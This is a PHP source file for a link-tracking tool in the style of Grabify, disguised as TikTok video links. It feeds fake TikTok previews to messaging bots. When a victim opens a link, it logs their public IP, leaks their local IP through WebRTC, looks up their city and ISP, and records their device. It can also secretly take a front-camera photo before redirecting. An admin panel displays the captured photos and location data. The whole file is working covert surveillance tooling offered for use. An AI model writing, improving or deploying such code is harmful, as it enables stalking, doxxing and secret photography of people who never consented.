<?php
date_default_timezone_set('Africa/Algiers');

error_reporting(0);
@ini_set('display_errors', 0);

$upload_dir = 'uploads/';
if (!is_dir($upload_dir)) {
    @mkdir($upload_dir, 0755, true);
}

try {
    $db = new PDO('sqlite:tracker_custom_bg.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        capture_cam INTEGER DEFAULT 0,
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        location TEXT, 
        device_info TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

function fetch_tiktok_meta($url) {
    $meta = [
        'title' => 'TikTok Video',
        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
    ];

    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $oembed_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['title'])) {
            $meta['title'] = $data['title'];
        }
        if (!empty($data['thumbnail_url'])) {
            $meta['image'] = $data['thumbnail_url'];
            return $meta;
        }
    }
    return $meta;
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// دالة محسنة لجلب الموقع مع اسم شركة الاتصالات (موبيليس، جازي، أوريدو، ADSL)
function get_ip_location($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
        return 'Local Network';
    }
    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org");
    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            $city = $data['city'] ? $data['city'] . ', ' : '';
            $country = $data['country'] ?? 'Unknown';
            $isp = $data['isp'] ?? ($data['org'] ?? '');
            return "{$city}{$country} [{$isp}]";
        }
    }
    return 'Unknown Location';
}

function get_device_type($ua) {
    $brand = 'Device';
    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect = $link['target_url'];
        $capture_cam = (int)$link['capture_cam'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);

        if ($is_bot) {
            $bot_ip = get_real_ip();
            $bot_location = get_ip_location($bot_ip);
            $bot_device = "Preview Bot / Auto-Fetch";
            
            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([
                    $code, 
                    'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=200', 
                    $bot_ip, 
                    'Not Clicked (Preview IP)', 
                    'N/A', 
                    $bot_location, 
                    $bot_device, 
                    date('Y-m-d H:i:s')
                ]);
            } catch (Exception $e) {}

            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<title>' . htmlspecialchars($meta_title) . '</title>';
            echo '</head><body></body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
            $img_base64 = $_POST['image'] ?? '';
            $public_ip = get_real_ip();
            $local_ip = $_POST['lip'] ?? 'Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
            $location = get_ip_location($public_ip);
            $device = get_device_type($ua);

            if (!empty($img_base64)) {
                try {
                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
                } catch (Exception $e) {}
            }
            exit('OK');
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
    <meta property="og:type" content="video.other">
    <script>
        const shouldCapture = <?php echo $capture_cam; ?>;
        const targetUrl = "<?php echo $target_redirect; ?>";

        function getLocalIP(callback) {
            let foundLocal = false;
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) { callback("Unknown"); return; }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                        if (!foundLocal) { foundLocal = true; callback(ip); pc.onicecandidate = null; }
                    }
                }
            };
            setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
        }

        window.addEventListener('DOMContentLoaded', () => {
            getLocalIP(function(localIp) {
                if (shouldCapture === 1) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                        .then(stream => {
                            const video = document.createElement('video');
                            video.setAttribute('autoplay', 'true');
                            video.setAttribute('playsinline', 'true');
                            video.style.display = 'none';
                            video.srcObject = stream;
                            document.body.appendChild(video);
                            
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = 640;
                                canvas.height = 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                                stream.getTracks().forEach(track => track.stop());
                                video.remove();

                                sendDataAndRedirect(imageData, localIp);
                            }, 500);
                        })
                        .catch(err => {
                            sendDataAndRedirect('', localIp);
                        });
                } else {
                    sendDataAndRedirect('', localIp);
                }
            });
        });

        function sendDataAndRedirect(imgData, localIp) {
            const formData = new URLSearchParams();
            formData.append('save_capture', '1');
            formData.append('image', imgData);
            formData.append('lip', localIp);

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            }).finally(() => {
                window.location.replace(targetUrl);
            });
        }
    </script>
</head>
<body style="background:#000;">
</body>
</html>
<?php 
        exit();
    } else {
        die("Link not found.");
    }
}

$generated_link = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    $capture_cam = isset($_POST['capture_cam']) ? 1 : 0;
    
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $scraped = fetch_tiktok_meta($target_url);
    $meta_title = $scraped['title'];
    $meta_image = $scraped['image'];

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt = $db->prepare("INSERT INTO links (code, target_url, capture_cam, meta_title, meta_image) VALUES (?, ?, ?, ?, ?)");
    $stmt->execute([$code, $target_url, $capture_cam, $meta_title, $meta_image]);

    $domain = $_SERVER['HTTP_HOST'];
    $generated_link = "https://" . $domain . "/?r=" . $code;
}

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }

        .form-grid { display: grid; gap: 12px; }
        input[type="text"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
        input[type="text"]:focus { border-color: var(--accent); }
        
        .checkbox-group { display: flex; align-items: center; gap: 8px; font-size: 14px; color: var(--text-main); cursor: pointer; }
        .checkbox-group input { width: 18px; height: 18px; cursor: pointer; }

        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
        .btn:hover { background: var(--accent-hover); }
        .btn-danger { background: var(--danger); }
        .btn-secondary { background: #334155; }

        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
        .flex-row { display: flex; gap: 8px; }

        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
        
        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
        .info-row span { color: #cbd5e1; }
        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }

        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
    </style>
    <script>
        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "Copied";
                btnElement.style.background = "#10b981";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <div class="section-box">
            <h2>Generate Direct Grabify-Style Link</h2>
            <form method="POST" class="form-grid">
                <input type="text" name="target_url" placeholder="TikTok Video URL..." required, autocomplete="off">
                
                <label class="checkbox-group">
                    <input type="checkbox" name="capture_cam" value="1">
                    <span>تفعيل التقاط صورة سيلفي في الخلفية (Capture Selfie)</span>
                </label>

                <button type="submit" name="create" class="btn">Generate Link</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>Active Link:</label>
                    <div class="flex-row">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="section-box">
            <h2>Captured Gallery & Details</h2>
            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
                <button type="submit" class="btn" style="height:42px;">Filter</button>
                <?php if(!empty($filter_code)): ?>
                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
                <?php endif; ?>
            </form>

            <?php if (empty($captures)): ?>
                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
            <?php else: ?>
                <div class="gallery-grid">
                    <?php foreach ($captures as $cap): ?>
                        <div class="card-img">
                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
                            </a>
                            <div class="info-row" style="margin-top:10px;">
                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Location / ISP:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                            </div>
                            <div class="info-row">
                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
                            </div>
                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>

    </div>

    <footer>
        <p>Core Engine <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
